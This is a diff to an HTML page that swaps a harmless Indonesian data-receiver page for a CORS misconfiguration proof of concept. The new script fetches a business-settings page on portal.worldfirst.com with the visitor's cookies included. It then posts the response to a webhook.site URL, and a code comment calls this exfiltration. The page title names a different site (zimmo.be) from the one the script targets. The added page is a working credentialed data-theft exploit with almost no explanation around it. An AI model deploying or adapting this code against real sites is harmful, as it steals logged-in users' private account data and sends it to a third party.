@@ -1,59 +1,33 @@
 <!doctype html>
-<html lang="id">
+<html>
   <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Ikur POC Receiver</title>
-    <style>
-      body { font-family: system-ui, sans-serif; margin: 2rem; line-height: 1.5; }
-      pre { background: #f3f4f6; border: 1px solid #d1d5db; border-radius: 6px; padding: 1rem; white-space: pre-wrap; overflow-wrap: anywhere; }
-      .muted { color: #6b7280; }
-    </style>
+    <title>Zimmo CORS PoC</title>
   </head>
   <body>
-    <h1>Ikur POC Receiver</h1>
-    <p class="muted">Halaman statis GitHub Pages untuk menampilkan data yang diteruskan melalui URL atau <code>postMessage</code>.</p>
-    <pre id="result">Belum ada data.</pre>
+    <h3>Zimmo.be CORS Misconfiguration PoC</h3>
+    <pre id="output">Running request...</pre>
 
     <script>
-      const result = document.querySelector('#result');
-      function isAllowedOrigin(origin) {
-        return origin === 'null'
-          || origin === 'http://localhost'
-          || origin.startsWith('http://localhost:')
-          || origin === 'http://127.0.0.1'
-          || origin.startsWith('http://127.0.0.1:');
-      }
-
-      function showData(data, source) {
-        const record = {
-          receivedAt: new Date().toISOString(),
-          source,
-          data
-        };
-
-        // Penyimpanan ini hanya ada di browser pengunjung, bukan di server GitHub Pages.
-        localStorage.setItem('ikur-poc-last-data', JSON.stringify(record));
-        result.textContent = JSON.stringify(record, null, 2);
-      }
-
-      const params = new URLSearchParams(window.location.search);
-      const queryData = params.get('data') || window.location.hash.slice(1);
-      if (queryData) {
-        try {
-          showData(JSON.parse(queryData), 'URL');
-        } catch {
-          showData(queryData, 'URL');
-        }
-      } else {
-        const saved = localStorage.getItem('ikur-poc-last-data');
-        if (saved) result.textContent = saved;
-      }
-
-      window.addEventListener('message', (event) => {
-        if (!isAllowedOrigin(event.origin)) return;
-        showData(event.data, `postMessage dari ${event.origin}`);
-      });
+      fetch("https://portal.worldfirst.com/setting/business", {
+        method: "GET",
+        credentials: "include",
+      })
+        .then(function (res) {
+          return res.text();
+        })
+        .then(function (data) {
+          document.getElementById("output").innerText = data;
+          // exfil to webhook for PoC evidence
+          fetch("https://webhook.site/41e326b8-ca14-4950-a11e-2dd349390ce7", {
+            method: "POST",
+            headers: { "Content-Type": "text/plain" },
+            body: data,
+          });
+        })
+        .catch(function (err) {
+          document.getElementById("output").innerText = "Error: " + err;
+        });
     </script>
   </body>
 </html>
